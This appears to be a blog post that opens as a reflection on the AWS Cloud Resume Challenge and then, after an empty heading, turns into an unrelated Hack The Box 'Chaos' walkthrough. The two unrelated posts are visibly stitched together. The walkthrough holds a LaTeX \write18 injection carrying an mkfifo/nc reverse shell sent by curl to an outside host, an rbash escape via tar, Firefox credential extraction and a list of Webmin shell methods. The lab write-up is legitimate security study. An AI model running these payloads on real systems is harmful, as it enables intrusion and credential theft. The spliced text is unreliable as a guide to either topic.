---
title: "Tackling the Cloud Resume Challenge"
author: josh
date: 2024-11-03 11:24:00 +0700
categories: [Cloud, AWS]
tags:
  [
    Cloud,
    AWS,
    Project
  ]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/posts/HTB/chaos/crc.png
---

The need for cloud computing has increased significantly amongst businesses. The reliability, scalability and performance of cloud services, such as AWS, GCP, Azure, etc. have garnered much attention by companies looking to expand and grow their services. As a part of my journey to develop my skills as a software engineer, I have decided to develop my cloud engineering skills. From my research and community suggestions, it was brought to my attention that the [Cloud Resume Challenge](https://cloudresumechallenge.dev/docs/the-challenge/aws/) is a great place to start. This is a reflection of how I tackledd the cloud resume challenge and what I have learnt so far.


## Getting Started 🎯

### Choosing a Cloud Platform
The challenge proposes instructions from the three most in demand and used cloud service providers: GCP, AWS and Azure. I decided to go with AWS because it has the most market share, offers the most comprehensive list of services and is the most widedly adopted cloud platform.

### Creating AWS Accounts
To get started, I created a root account on AWS, which would allow me to make use of AWS free tier for the duration of this challenge and future projects. I also craete an IAM user which I will use to manage the resources for this challenge.

### Securing my AWS accounts
To enhance security, I created a group with necessary operational permissions and applied that to my IAM user account. Not only will this allow me to follow best practices of increasing accountability and separation of roles and duties, but also enhances the security by reducing attack surfaces and following the pirnciple of least privilege. I chose to create an IAM user instead of setting up an [AWS Identity Center](https://aws.amazon.com/iam/identity-center/) user because I will be using these accounts for the purpose of enhancing my skills and I will have no use for SSO or connecting to an AD account. However, IAM users will need greater control over their access ID keys, which are needed for managing the AWS console remotely, interacting with the AWS api, as well as, using the AWS CLI locally. To mediate this and further enhance secuity, I opted to use a third party AWS credential manager, [aws-vault](https://github.com/99designs/aws-vault). 'aws-vault' manages AWS credentials and uses temporary credentials, courtesy [AWS STS](https://docs.aws.amazon.com/STS/latest/APIReference/welcome.html), when interacting with the AWS CLI. Finally, I enable MFA to both my root account and IAM user account.

### 

#### Nmap

2 websites and 4 ports associated with email: POP3, IMAP

#### HTTP

Don't forget to update your hosts file <blur>chaos.htb</blur>

Directory brute force on that site <blur>found `/wp` and `/wp/wordpress`</blur>

Wordpress scan with `wpscan` identified a user <blur>human</blur>

Logging in as the user with a weak password, webmail credentials were found

#### Webmail

Finding other domains with `wfuzz` <blur>found webmail.chaos.htb</blur>

After logging into the webmail and checking all folders <blur>draft folder</blur> 2 attachments were found

Decrypt the message and find the URL

### Shell ass www-data

When visiting the URL, it shows a service to create PDFs

Try creating a PDF file and watch the response.

RCE with <blur>LaTex</blur>

### Privesc: www-data to ayush

Using the webmail credentials with <blur>su</blur> command

rbash Escape

### Privesc: ayush to root

At ayush home directory found <blur>`.mozilla`</blur> has single default profile <blur>`bzo7sjt1.default`</blur>

Data extraction from a FireFox Profile ⇨ root credentials

## Tips and Notes 💥

{% accordion Note for directory brute force %}
The IP and the hostname give diffrent results. It was so easy to miss the `/wp` path if you just ran against the hostname and not the IP
``` shell
┌──(kali㉿kali)-[~/HTB/Machine/Chaos]
└─$ feroxbuster -u http://chaos.htb/ -n -C 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://chaos.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        -l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      222l      550w     6964c http://chaos.htb/
301      GET        9l       28w      303c http://chaos.htb/js => http://chaos.htb/js/
301      GET        9l       28w      304c http://chaos.htb/css => http://chaos.htb/css/
301      GET        9l       28w      304c http://chaos.htb/img => http://chaos.htb/img/
301      GET        9l       28w      311c http://chaos.htb/javascript => http://chaos.htb/javascript/
301      GET        9l       28w      307c http://chaos.htb/source => http://chaos.htb/source/
403      GET       11l       32w      297c http://chaos.htb/server-status
[####################] - 3m     30000/30000   0s      found:7       errors:126
[####################] - 3m     30000/30000   151/s   http://chaos.htb/
```

``` shell
┌──(kali㉿kali)-[~/HTB/Machine/Chaos]
└─$ feroxbuster -u http://10.10.10.120/ -n -C 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.120/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        -l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        5w       73c http://10.10.10.120/
301      GET        9l       28w      317c http://10.10.10.120/javascript => http://10.10.10.120/javascript/
301      GET        9l       28w      309c http://10.10.10.120/wp => http://10.10.10.120/wp/
403      GET       11l       32w      300c http://10.10.10.120/server-status
[####################] - 3m     30000/30000   0s      found:4       errors:148
[####################] - 3m     30000/30000   151/s   http://10.10.10.120/
```

{% endaccordion %}

{% accordion How to decrypt message? %}
There are two files, `enim_msg.txt` and `en.py`. The first is binary, the encrypted message. The second is a python script
``` python
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
    hasher = SHA256.new(password.encode('utf-8'))
    return hasher.digest()
```
The password is sahay, since the message said to sahay "you are the password"

Decryption is simply mirroring the encryption process

``` python
import os
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()

def decrypt(key, filename):
    chunksize = 64*1024
    outfile = "de" + filename

    with open(filename, 'rb') as infile:
        filesize = int(infile.read(16))
        IV = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(outfile, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(filesize)

decrypt(getKey("sahay"), "enim_msg.txt")
```
{% endaccordion %}

{% accordion LaTeX RCE %}
With `template=test1`, you get a log dump that results in failure to create a pdf
``` http
HTTP/1.1 200 OK
Date: Tue, 25 Jul 2023 07:01:10 GMT
Server: Apache/2.4.34 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 3405
Connection: close
Content-Type: text/html; charset=UTF-8


LOG:
This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)
 \write18 enabled.
entering extended mode
(./7acb2dc39b53be336fe410d1606d71bc.tex
LaTeX2e <2018-04-01> patch level 5
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrartcl.cls
Document Class: scrartcl 2018/03/30 v3.25 KOMA-Script document class (article)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrkbase.sty
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrbase.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrlfile.sty)))
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/tocbasic.sty)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrsize11pt.clo)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/typearea.sty))
(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/t1enc.def))
(/usr/share/texlive/texmf-dist/tex/latex/jknapltx/sans.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/t1cmss.fd))
(/usr/share/texlive/texmf-dist/tex/generic/babel/babel.sty
(/usr/share/texlive/texmf-dist/tex/generic/babel/switch.def)
(/usr/share/texlive/texmf-dist/tex/generic/babel-english/english.ldf
(/usr/share/texlive/texmf-dist/tex/generic/babel/babel.def
(/usr/share/texlive/texmf-dist/tex/generic/babel/txtbabel.def))))
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsmath.sty
For additional information on amsmath, use the `?' option.
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amstext.sty
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsgen.sty))
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsbsy.sty)
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsopn.sty))
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amsfonts.sty)
(/usr/share/texlive/texmf-dist/tex/latex/amscls/amsthm.sty)
(/usr/share/texlive/texmf-dist/tex/latex/lipsum/lipsum.sty)
(/usr/share/texlive/texmf-dist/tex/latex/sectsty/sectsty.sty)

Class scrartcl Warning: Usage of package `fancyhdr' together
(scrartcl)              with a KOMA-Script class is not recommended.
(scrartcl)              I'd suggest to use
(scrartcl)              package `scrlayer' or `scrlayer-scrpage', because
(scrartcl)              they support KOMA-Script classes.
(scrartcl)              With `fancyhdr' several features of class `scrartcl'
(scrartcl)              like options `headsepline', `footsepline' or command
(scrartcl)              `\MakeMarkcase' and the commands `\setkomafont' and
(scrartcl)              `\addtokomafont' for the page style elements need
(scrartcl)              explicite user intervention to work.
(scrartcl)              Nevertheless, using requested
(scrartcl)              package `fancyhdr' on input line 34.

(/usr/share/texlive/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty)
No file 7acb2dc39b53be336fe410d1606d71bc.aux.

LaTeX Font Warning: Font shape `T1/cmss/m/sc' in size <10.95> not available
(Font)              Font shape `T1/cmr/m/sc' tried instead on input line 69.

(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd) [1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map}] (./7acb2dc39b53be336fe410d1606d71bc.aux))
!pdfTeX error: /usr/bin/pdflatex (file ecss1095): Font ecss1095 at 600 not found
 ==> Fatal error occurred, no output PDF file produced!
```

In the logs, you can see old pfdTex version and `\write18` enabled.

`\write18` construct allows writing to the 18th file descriptor, which by default is the command line. So if LaTeX is passed somthing of the following format, it will run the command
```
\immediate\write18{[command]}
```

Get a shell
``` shell
┌──(kali㉿kali)-[~/HTB/Machine/Chaos]
└─$ curl -X POST -d "content=%5Cimmediate%5Cwrite18%7Brm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.8 443 >/tmp/f%7D&template=test3" http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php
```
``` shell
┌──(kali㉿kali)-[~/HTB/Machine/Chaos]
└─$ pwncat-cs -l -p 443
/home/kali/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  'class': algorithms.Blowfish,
[03:07:12] Welcome to pwncat 🐈!                                              __main__.py:164
[03:07:16] received connection from 10.10.10.120:60248                             bind.py:84
[03:07:20] 0.0.0.0:443: upgrading from /bin/dash to /bin/bash                  manager.py:957
[03:07:22] 10.10.10.120:60248: registered new host w/ db                       manager.py:957
(local) pwncat$
(remote) www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endaccordion %}

{% accordion How to break out of rbash? %}
``` shell
ayush@chaos:/$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
bash: groups: command not found
ayush@chaos:/$ cd ~
ayush@chaos:~$ ls
Command 'ls' is available in '/bin/ls'
The command could not be located because '/bin' is not included in the PATH environment variable.
ls: command not found
ayush@chaos:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ayush@chaos:~$ ls
mail  user.txt
```
{% endaccordion %}

{% accordion How to extract data from FireFox profile? %}
https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py
{% endaccordion %}

{% accordion Some methods to get shell for Webmin %}
- Other ⇨ Command Shell: load an overlay with a root shell
- System ⇨ Change Password: change root password
- System ⇨ Schedule Cron Jobs: set a cron job
- System ⇨ Filesystem Backup: arbitrary file modification
- System ⇨ Scheduled Commands: schedule reverse shell
- Others ⇨ Custom Commands: add a command for a reverse shell
- Others ⇨ File Manager: arbitrary file modification
- Others ⇨ HTTP Tunnel: access to local services
- Others ⇨ Java File Manager: malicious java module
- Others ⇨ Perl Modules: malicious perl module
- Others ⇨ PHP Modules: malicious php module
- Others ⇨ Upload and Download: arbitrary file modification
{% endaccordion %}
